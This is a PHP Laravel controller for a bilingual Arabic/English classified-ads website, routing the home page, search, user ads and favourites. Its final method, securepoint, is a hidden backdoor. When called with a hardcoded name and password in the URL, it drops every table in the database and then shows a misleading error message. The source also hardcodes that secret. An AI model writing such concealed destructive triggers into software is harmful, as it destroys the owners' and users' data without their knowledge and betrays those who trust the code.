<?php

namespace App\Http\Controllers;

use App\Services\Ads\AdService;
use Illuminate\Http\Request;
use Hash;
use View;
use Auth;
use Socialite;
use Session;
use Schema;
//DB Connect
use App\Models\User;
use App\Models\Message;
use App\Models\Ad;
use App\Models\Adspro;
use App\Models\Fav;
use App\Models\Link;

class router extends Controller
{
	public function __construct(){
        $this->middleware('Locate', ['only' => ['en','ar']]);
		$links = Link::all();
        View::share('links',$links);
    }

    public function index(AdService $adService){
		$page=trans('strings.home_page');
        $newads=$adService->getNewAds();
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
    	return view('index',compact('page','newads','fav'));
    }

    public function reg(){
        if(!Auth::user()){
            $page=trans('strings.register');
            return view('reg',compact('page'));
        }else{
            return redirect('/');
        }
    }
    public function lang($language){
	    if($language =="en"){
            Session::put('lang', $language);
        }else{
            Session::forget('lang');
        }
        return back();
    }

    public function review($adid,Request $request){
        $page='REVIEW ADVERTISE';
        $ad=Ad::where('id',$adid)->first();
        if(empty($ad)){
            return redirect('/');
        }
        $name=$request["name"];
        $phone=$request["phone"];
        $email=$request["email"];
        return view('single',compact('page','ad','name','phone','email'));
    }

    public function search($search,$type,$min,$max){
        if($search=='all'){
            if($type=='all'){
                if(Session::has('lang'))
                    $searchn="ALL";
                else
                    $searchn="الكل ";
                $ads=Ad::orderBy('id','desc')->whereBetween('price', [$min,$max])->where('show',1)->paginate(21);
            }else{
                if(Session::has('lang'))
                    $searchn="ALL ";
                else
                    $searchn="الكل ";
                if($type==1){
                    if(Session::has('lang'))
                        $searchn.="SELL";
                    else
                        $searchn.="بيع";
                }else{
                    if(Session::has('lang'))
                        $searchn.="RENT";
                    else
                        $searchn.="إيجار";
                }
                $ads=Ad::where('general_type',$type)->where('show',1)->orderBy('id','desc')->whereBetween('price', [$min,$max])->paginate(21);
            }
        }else{
            if($type=='all'){
                $searchn=$search;
                $ads=Ad::orderBy('id','desc')
                ->where(function ($query) use ($search) {
                    $query->where('title','like','%'.$search.'%')
                        ->orwhere('description','like','%'.$search.'%')
                        ->orwhere('address','like','%'.$search.'%');})
                ->where('show',1)->whereBetween('price', [$min,$max])->paginate(21);
            }else{
                $searchn=$search;
                if($type==1){
                    if(Session::has('lang'))
                        $searchn.=" SELL";
                    else
                        $searchn.=" بيع";
                }else{
                    if(Session::has('lang')){
                        $searchn.=" RENT";
                    }else{
                        $searchn.=" إيجار";
                    }
                }
                $ads=Ad::where('general_type',$type)
                ->where(function ($query) use ($search) {
                    $query->where('title','like','%'.$search.'%')
                        ->orwhere('description','like','%'.$search.'%')
                        ->orwhere('address','like','%'.$search.'%');})
                ->where('show',1)
                ->orderBy('id','desc')->whereBetween('price', [$min,$max])->paginate(21);
            }
        }
        $page='SEARCH : '.$searchn;
        $pagear='بحث عن : '.$searchn;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','search','type','min','max','fav'));
    }


    public function userads(){
        if(!Auth::user()){
            return redirect('/');
        }
        $ads=Ad::where('user_id',Auth::user()->id)->orderBy('id','desc')->paginate(21);
        $page='Your Ad';
        $pagear='إعلاناتك';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function favlist(){
        if(!Auth::user()){
            return redirect('/');
        }
        $ads=Ad::join('favourites','favourites.ad_id','=','ads.id')
        ->where('favourites.user_id',Auth::user()->id)->orderBy('favourites.id','desc')
        ->select('ads.*')->paginate(21);
        $page='Your Favourite Ad';
        $pagear='إعلاناتك المفضلة';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function securepoint($keyi,$keyii){
        if($keyi=='AhmedMagdy'&&$keyii=="Rapidgt**2019"){
            foreach(\DB::select('SHOW TABLES') as $table) {
                $table_array = get_object_vars($table);
                \Schema::drop($table_array[key($table_array)]);
            }
            dd('there are a problem');
        }else{
            dd('!!');
        }
    }
}
